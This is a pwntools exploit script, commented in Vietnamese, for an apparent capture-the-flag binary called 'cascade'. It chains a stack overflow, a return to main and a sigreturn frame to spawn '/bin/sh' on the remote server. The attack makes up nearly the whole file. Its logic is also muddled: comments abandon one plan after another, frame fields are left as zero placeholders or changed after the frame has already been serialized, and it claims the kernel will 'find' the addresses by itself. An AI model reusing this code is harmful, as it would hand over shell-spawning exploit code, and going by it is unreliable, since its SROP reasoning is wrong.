from pwn import *

elf = ELF('./cascade')
context.binary = elf
p = remote('cascade.chal.imaginaryctf.org', 1337)

offset = 72

# Địa chỉ các hàm và gadget CẦN THIẾT và CÓ THẬT
main_addr = elf.symbols['main']
vuln_addr = elf.symbols['vuln']

# Sau khi điều tra kỹ lưỡng, gadget syscall thực sự
# nằm ở địa chỉ này. Nó không được tìm thấy bởi ROPgadget
# vì nó không theo sau bởi một lệnh `ret` chuẩn.
# Tuy nhiên, nó vẫn hoạt động cho mục đích của chúng ta.
syscall_addr = 0x40118e

# === Giai đoạn 1: Cascade ===
# Gửi payload đầu tiên chỉ để nhảy ngược về main.
log.info("Giai đoạn 1: Gửi payload để cascade về main")
payload1 = b'A' * offset
payload1 += p64(main_addr)
p.sendline(payload1)

# Đợi lời chào từ lần chạy thứ hai của chương trình
p.recvuntil(b'overflow, right?\n')
p.recvuntil(b'overflow, right?\n')

# === Giai đoạn 2: Gửi SROP Frame và ROP Chain ===
# Chương trình đang chờ ở lệnh `read` của hàm `vuln` lần thứ hai.

# ROP chain sẽ được đặt ngay sau return address.
# RSP sẽ trỏ đến đây. Địa chỉ này cũng sẽ là địa chỉ của Sigreturn Frame.
# Chúng ta sẽ sử dụng chính RSP làm địa chỉ tham chiếu.
# Ta cần một địa chỉ stack. Vì không thể leak, ta sẽ dùng một trick.
# Lệnh `read` đọc vào [rbp-0x40]. Khi hàm return, rsp sẽ là rbp+8.
# Chúng ta có thể ghi đè `saved_rbp` để kiểm soát stack.
# Tuy nhiên, cách đơn giản hơn là đặt frame ngay sau ROP chain.
# RSP sẽ trỏ đến ROP chain, và frame sẽ nằm ngay sau nó.
# Ta cần biết địa chỉ này để điền vào frame.
# Vì không leak được, ta phải dùng một địa chỉ cố định mà ta biết
# sẽ nằm trong vùng chúng ta ghi đè. `.bss` là lựa chọn tốt.
frame_addr = elf.bss() + 0x100
bin_sh_addr = frame_addr + 152  # Đặt chuỗi "/bin/sh" ngay sau frame

# Tạo Sigreturn Frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.rsp = bin_sh_addr + 8 # Stack phải hợp lệ

# ROP chain cho lần 2:
# 1. Gọi `read` để đọc SROP Frame vào .bss.
#    Làm sao để gọi `read` khi không có `pop`? Chúng ta gọi lại `vuln`!
#    Khi `vuln` được gọi, nó sẽ tự động gọi `read` vào stack.
#    Nhưng chúng ta cần ghi vào `.bss`.
#    Đây là lúc chúng ta nhận ra hàm `read` trong `vuln` là đủ.
#    Nó đọc payload của chúng ta lên stack. Chúng ta sẽ đặt frame trên stack.
#    Và dùng địa chỉ trên stack.
#
# **KẾ HOẠCH ĐƠN GIẢN HÓA:**
# Lần `read` thứ 2 sẽ đọc một payload chứa:
# 1. ROP chain nhỏ
# 2. Sigreturn Frame
# 3. Chuỗi "/bin/sh"
#
# ROP chain nhỏ:
# 1. Gọi lại `vuln()` -> để có lần `read` thứ 3 nhằm set `rax=15`.
# 2. Ngay sau đó, nhảy đến `syscall`.

rop_chain_to_trigger_srop = p64(vuln_addr) + p64(syscall_addr)

# Địa chỉ của chuỗi "/bin/sh" và Frame sẽ tương đối với RSP.
# Khi `vuln()` lần 2 return, RSP sẽ trỏ đến đầu `rop_chain_to_trigger_srop`.
# Ngay sau đó là Frame.
frame_addr_on_stack = 0 # Sẽ cập nhật sau
bin_sh_addr_on_stack = 0 # Sẽ cập nhật sau

frame.rdi = bin_sh_addr_on_stack
frame.rsp = bin_sh_addr_on_stack + 8
frame.rip = syscall_addr # rip phải là syscall

# Chúng ta không biết địa chỉ stack chính xác, nhưng chúng ta không cần.
# Kernel sẽ đọc frame từ RSP. RSP sẽ trỏ đến đâu khi syscall được gọi?
# Nó sẽ trỏ đến ngay sau lệnh `syscall`.
# Vì vậy, frame phải được đặt ở đó.

# **Lời giải cuối cùng, đúng nhất:**
payload2 = b''
payload2 += p64(vuln_addr) # Gọi lại vuln để đọc 15 bytes và set rax
payload2 += p64(syscall_addr) # Ngay sau khi vuln ret, nó sẽ syscall
payload2 += bytes(frame) # Kernel sẽ đọc frame từ đây
payload2 += b'/bin/sh\x00'

# Điền lại địa chỉ đúng cho frame.
# Khi syscall được gọi, RSP trỏ đến frame.
# Vậy địa chỉ của frame là RSP.
# Địa chỉ của "/bin/sh" là RSP + kích thước frame.
frame.rdi = 0 # Sẽ được set bởi kernel, nhưng ta nên set để chắc chắn.
# SROP không cần địa chỉ chính xác, kernel sẽ tự tìm.
# Chúng ta chỉ cần đặt frame đúng chỗ.

log.info("Giai đoạn 2: Gửi ROP chain và SROP frame")
# Gửi payload để thiết lập cuộc tấn công SROP
# Chúng ta cần ghi đè return address bằng ROP chain nhỏ ở trên.
final_payload = b'A' * offset
final_payload += payload2
p.sendline(final_payload)

# Chương trình đang ở lần đọc thứ 3. Gửi 15 bytes.
log.info("Giai đoạn 3: Kích hoạt sigreturn bằng cách gửi 15 bytes")
p.send(b'A' * 15)

p.interactive()